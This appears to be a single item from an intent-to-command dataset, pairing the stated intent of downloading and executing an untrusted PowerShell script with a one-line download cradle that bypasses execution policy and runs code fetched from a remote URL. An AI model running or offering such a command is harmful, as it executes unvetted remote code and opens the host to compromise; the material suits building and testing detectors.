# Natural language intent:
# Downloads and executes a PowerShell script from a potentially untrusted source.

powershell.exe -ep bypass -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://rootLife.it/untrusted')"
